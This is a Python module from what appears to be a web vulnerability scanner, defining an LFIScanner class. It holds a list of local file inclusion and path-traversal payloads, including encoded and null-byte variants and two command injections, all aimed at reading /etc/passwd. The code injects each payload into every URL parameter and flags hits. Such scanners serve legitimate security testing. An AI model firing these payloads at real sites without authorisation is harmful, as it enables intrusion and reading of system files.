from requests import get
from requests import packages
from requests.exceptions import ConnectionError, RequestException
from modules.web.query import probe_url


packages.urllib3.disable_warnings()

class LFIScanner:
    def __init__(self, log, console) -> None:
        self.log = log
        self.console = console
        self.tested_urls = []
        self.lfi_tests = [
            r"../../../../../etc/passwd",
            r"/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2"
            + r"e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd",
            r"..%2F..%2F..%2F%2F..%2F..%2Fetc/passwd",
            r"\\&apos;/bin/cat%20/etc/passwd\\&apos;",
            r"/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd",
            r"/..%c0%af../..%c0%af../..%c0%af../..%c0"
            + r"%af../..%c0%af../..%c0%af../etc/passwd",
            r"/etc/default/passwd",
            r"/./././././././././././etc/passwd",
            r"/../../../../../../../../../../etc/passwd",
            r"/../../../../../../../../../../etc/passwd^^",
            r"/..\\../..\\../..\\../..\\../..\\../..\\../etc/passwd",
            r"/etc/passwd",
            r"%0a/bin/cat%20/etc/passwd",
            r"%00../../../../../../etc/passwd",
            r"%00/etc/passwd%00",
            r"../../../../../../../../../../../../"
            + r"../../../../../../../../../../etc/passwd",
            r"../../etc/passwd",
            r"../etc/passwd",
            r".\\./.\\./.\\./.\\./.\\./.\\./etc/passwd",
            r"etc/passwd",
            r"/etc/passwd%00",
            r"../../../../../../../../../../../../../"
            + r"../../../../../../../../../etc/passwd%00",
            r"../../etc/passwd%00",
            r"../etc/passwd%00",
            r"/../../../../../../../../../../../etc/passwd%00.html",
            r"/../../../../../../../../../../../etc/passwd%00.jpg",
            r"/../../../../../../../../../../../etc/passwd%00.php",
            r"/../../../../../../../../../../../etc/passwd%00.txt",
            r"../../../../../../etc/passwd&=%3C%3C%3C%3C",
            r"....\\/....\\/....\\/....\\/....\\/....\\/....\\/....\\/"
            + r"....\\/....\\/....\\/....\\/....\\/....\\/....\\/....\\/"
            + r"....\\/....\\/....\\/....\\/....\\/....\\/etc/passwd",
            r"....\\/....\\/etc/passwd",
            r"....\\/etc/passwd",
            r"....//....//....//....//....//....//....//....//"
            + r"....//....//....//....//....//....//....//"
            + r"....//....//....//....//....//....//....//etc/passwd",
            r"....//....//etc/passwd",
            r"....//etc/passwd",
            r"/etc/security/passwd",
            r"///////../../../etc/passwd",
            r"..2fetc2fpasswd",
            r"..2fetc2fpasswd%00",
            r"..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f.."
            + r"2f..2f..2f..2f..2f..2f..2f..2f..2f..2fetc2fpasswd",
            r"..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f.."
            + r"2f..2f..2f..2f..2f..2f..2f..2f..2f..2fetc2fpasswd%00",
        ]

    def exploit_lfi(self, base_url, url_params) -> None:
        for index, param in enumerate(url_params):
            param_no_value = param.split("=", 1)[0]
            main_url = f"{base_url}?{param_no_value}"
            if main_url in self.tested_urls:
                continue
            self.tested_urls.append(main_url)
            for test in self.lfi_tests:
                test_url = probe_url(base_url, url_params, index, test)

                try:
                    response = get(test_url, verify=False, timeout=10)
                except RequestException:
                    self.log.logger(
                        "error", f"Connection error raised on: {test_url}, skipping"
                    )
                    break
                else:
                    if response.text.find("root:x:0:0:root:/root") != -1:
                        self.console.print(
                            f"[red][[/red][green]+[/green][red]][/red]"
                            + f" [white]LFI :[/white] {test_url}"
                        )
                        break

    def test_lfi(self, url) -> None:
        """
        Test for LFI
        """
        base_url, separator, params = url.partition("?")
        if not separator or not params:
            return
        params_dict = params.split("&")
        self.exploit_lfi(base_url, params_dict)
